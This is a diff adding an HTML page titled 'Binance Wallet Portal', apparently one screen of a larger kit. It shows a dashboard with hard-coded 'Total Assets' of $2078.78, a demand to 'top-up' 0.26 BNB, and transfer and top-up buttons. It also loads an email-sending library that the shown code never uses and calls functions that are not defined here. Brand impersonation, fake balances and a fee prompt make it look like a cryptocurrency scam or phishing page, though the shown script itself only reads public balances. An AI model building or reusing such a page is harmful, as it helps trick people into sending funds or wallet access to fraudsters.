@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Binance Wallet Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background-color: #181A20;
+      color: #EAECEF;
+      font-weight: bold;
+    }
+    .page { display: none; padding: 20px; }
+    .visible { display: block !important; }
+    .form-container { max-width: 400px; margin: 0 auto; position: relative; }
+    input, button {
+      width: 100%; padding: 12px; margin: 10px 0;
+      border-radius: 6px; border: none;
+      font-size: 1rem;
+    }
+    button {
+      background-color: #f3ba2f;
+      color: #181A20;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .token {
+      background: #2E3239;
+      display: flex; justify-content: space-between;
+      padding: 15px; border-radius: 10px;
+      margin: 10px 0; align-items: center;
+      position: relative;
+    }
+    .token-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .token img {
+      width: 24px; height: 24px;
+      animation: float 2s ease-in-out infinite;
+      cursor: pointer;
+    }
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-4px); }
+    }
+    .tooltip {
+      position: absolute;
+      top: 100%;
+      left: 0;
+      background-color: #1E1F25;
+      color: white;
+      border-radius: 6px;
+      padding: 8px;
+      margin-top: 6px;
+      font-size: 0.8rem;
+      display: none;
+      z-index: 1000;
+      width: 240px;
+    }
+    .tooltip.show {
+      display: block;
+      animation: fadeIn 0.2s ease-in-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-5px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .button-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .button-group button {
+      flex: 1 1 30%;
+    }
+    .status-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    #walletStatus {
+      background-color: #f3ba2f;
+      color: #181A20;
+      padding: 4px 10px;
+      border-radius: 5px;
+      font-size: 0.8rem;
+    }
+  </style>
+</head>
+<body onload="initApp()">
+
+<!-- Page 5: Dashboard -->
+<div class="page" id="page5">
+  <div class="form-container">
+    <div class="status-bar">
+      <h2>Dashboard</h2>
+      <span id="walletStatus"></span>
+    </div>
+    <p style="color: #f3ba2f;">Total Assets: <strong id="totalAssets">$2078.78</strong></p>
+    <p>Total amount of BNB to top-up is: <strong style="color:#f3ba2f;">0.26 BNB</strong></p>
+    <div class="token">
+      <div class="token-left">
+        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" onclick="toggleTooltip('usdtTooltip')">
+        <span>USDT</span>
+      </div>
+      <div id="usdt_amount">$0.00</div>
+      <div class="tooltip" id="usdtTooltip">
+        <strong>Token:</strong> USDT<br>
+        <strong>Network:</strong> BNB Smart Chain (BEP20)<br>
+        <strong>Balance:</strong> <span id="usdtTooltipBal">$0.00</span><br>
+        <button onclick="copyWallet()">📋 Copy Wallet Address</button>
+      </div>
+    </div>
+    <div class="token">
+      <div class="token-left">
+        <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="BNB" onclick="toggleTooltip('bnbTooltip')">
+        <span>BNB</span>
+      </div>
+      <div id="bnb_amount">$0.00</div>
+      <div class="tooltip" id="bnbTooltip">
+        <strong>Token:</strong> BNB<br>
+        <strong>Network:</strong> BNB Smart Chain (BEP20)<br>
+        <strong>Balance:</strong> <span id="bnbTooltipBal">$0.00</span><br>
+        <button onclick="copyWallet()">📋 Copy Wallet Address</button>
+      </div>
+    </div>
+    <div class="button-group">
+      <button onclick="goToScan('Transfer to Main Wallet')">Transfer to Main Wallet</button>
+      <button onclick="goToScan('Receive')">Receive</button>
+      <button onclick="goToScan('Top Up BNB')">Top Up BNB</button>
+    </div>
+    <button onclick="logoutUser()" style="margin-top: 30px; background:#f6465d; color:white;">Sign Out</button>
+  </div>
+</div>
+
+<script>
+const bscApiKey = "YourApiKeyToken";
+const usdtContract = "0x55d398326f99059fF775485246999027B3197955"; // USDT
+
+let prices = { tether: 1.00, binancecoin: 0 };
+
+async function fetchPrices() {
+  try {
+    const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=tether,binancecoin&vs_currencies=usd");
+    const data = await res.json();
+    prices = data;
+  } catch (e) {
+    console.error("Error fetching prices:", e);
+  }
+}
+
+async function fetchBalances(address) {
+  try {
+    const bnbRes = await fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${bscApiKey}`);
+    const bnbData = await bnbRes.json();
+    const bnb = (parseFloat(bnbData.result) / 1e18).toFixed(4);
+
+    const usdtRes = await fetch(`https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${usdtContract}&address=${address}&tag=latest&apikey=${bscApiKey}`);
+    const usdtData = await usdtRes.json();
+    const usdt = (parseFloat(usdtData.result) / 1e18).toFixed(2);
+
+    document.getElementById("usdt_amount").textContent = `$${usdt}`;
+    document.getElementById("bnb_amount").textContent = `${bnb} BNB`;
+    document.getElementById("usdtTooltipBal").textContent = `$${usdt}`;
+    document.getElementById("bnbTooltipBal").textContent = `${bnb} BNB`;
+
+    const usdtUSD = parseFloat(usdt) * prices.tether.usd;
+    const bnbUSD = parseFloat(bnb) * prices.binancecoin.usd;
+    const total = (usdtUSD + bnbUSD).toFixed(2);
+    document.getElementById("totalAssets").textContent = `$${total}`;
+  } catch (e) {
+    console.error("Error fetching balances:", e);
+  }
+}
+
+function loadDashboard() {
+  const address = localStorage.getItem("wallet_address");
+  document.getElementById("walletStatus").textContent = address
+    ? `Connected: ${address.slice(0, 6)}...${address.slice(-4)}`
+    : "Not Connected";
+  if (address) {
+    fetchPrices().then(() => fetchBalances(address));
+    setInterval(() => {
+      fetchPrices().then(() => fetchBalances(address));
+    }, 60000);
+  }
+}
+
+function copyWallet() {
+  const wallet = localStorage.getItem("wallet_address");
+  if (!wallet) return alert("No wallet connected.");
+  navigator.clipboard.writeText(wallet).then(() => alert("Wallet address copied to clipboard!"));
+}
+
+function logoutUser() {
+  if (confirm("Are you sure you want to log out?")) {
+    localStorage.clear();
+    location.reload();
+  }
+}
+
+function toggleTooltip(id) {
+  const el = document.getElementById(id);
+  const others = document.querySelectorAll('.tooltip');
+  others.forEach(tip => { if (tip !== el) tip.classList.remove('show'); });
+  el.classList.toggle('show');
+  document.addEventListener("click", function outsideClick(e) {
+    if (!el.contains(e.target) && !e.target.matches('img')) {
+      el.classList.remove('show');
+      document.removeEventListener("click", outsideClick);
+    }
+  });
+}
+</script>
+</body>
+</html>
